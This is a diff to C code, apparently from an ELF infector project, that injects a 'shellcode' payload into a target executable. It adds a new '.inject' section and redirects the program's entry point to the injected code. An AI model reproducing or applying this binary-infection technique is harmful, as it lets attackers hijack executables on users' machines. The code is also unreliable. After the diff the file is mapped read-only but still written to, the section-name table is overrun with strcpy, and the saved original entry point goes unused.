@@ -40,8 +40,7 @@ void	*get_map(char *str)
 		return (NULL);
 	}
 	off_t f_size = lseek(fd, 0, SEEK_END);
-	// MAP_SHARED will edit the actual file and not just a copy of it
-	void	*map = mmap(NULL, f_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); 
+	void	*map = mmap(NULL, f_size, PROT_READ, MAP_SHARED, fd, 0); 
 	if (map == MAP_FAILED)
 	{
 		write(2, "problem mapping file\n", 21);
@@ -104,13 +103,22 @@ int get_text_section_index(void *map, Elf64_Ehdr *eheader)
 	}
 	return (-1);
 }
+#define NEW_SECTION_NAME ".inject"
 
-void *update_elf(void *map, size_t aligned_offset, int fd)
+
+void update_elf(void *map, size_t aligned_offset, int fd)
 {
 	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
 	Elf64_Shdr *shdr_table = (Elf64_Shdr *)(map + ehdr->e_shoff);
 	
 	size_t shellcode_size = sizeof(shellcode);
+
+	Elf64_Shdr *shdr_strtab = &shdr_table[ehdr->e_shstrndx];
+	char *shstrtab = map + shdr_strtab->sh_offset;
+	Elf64_Word new_name_offset = shdr_strtab->sh_size;
+
+	strcpy(shstrtab + new_name_offset, NEW_SECTION_NAME);
+	shdr_strtab->sh_size += strlen(NEW_SECTION_NAME) + 1;
 
 	Elf64_Shdr injected_section = {0};
 	injected_section.sh_name = new_name_offset; // Offset in new .shstrtab
@@ -130,28 +138,22 @@ void *update_elf(void *map, size_t aligned_offset, int fd)
 	}
 
 	// Resize the memory map
-	size_t new_size = aligned_offset + shellcode_size;
-	void *new_map = mmap(NULL, new_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-	if (new_map == MAP_FAILED) {
-		perror("problem mapping file");
-		return;
-	}
-	memcpy(new_map + aligned_offset, shellcode, shellcode_size);
+	memcpy(map + aligned_offset, shellcode, shellcode_size);
 	
 	// save original entry point
 	Elf64_Addr original_entry = ehdr->e_entry;
 
 	// Update ELF header and Set entry point to the start of the injected code
 	ehdr->e_shoff = aligned_offset + shellcode_size;
-    ehdr->e_shnum += 1;
     ehdr->e_entry = injected_section.sh_addr;
 	printf("New entry point set to: 0x%lx\n", ehdr->e_entry);
 
 
 	// update section header
-	Elf64_Shdr *new_shdr_table = (Elf64_Shdr *)(map + new_shoff);
+	Elf64_Shdr *new_shdr_table = (Elf64_Shdr *)(map + ehdr->e_shoff);
 	memcpy(new_shdr_table, shdr_table, ehdr->e_shnum * sizeof(Elf64_Shdr));
 	memcpy(&new_shdr_table[ehdr->e_shnum], &injected_section, sizeof(Elf64_Shdr));
+    ehdr->e_shnum += 1;
 }
 
 /*
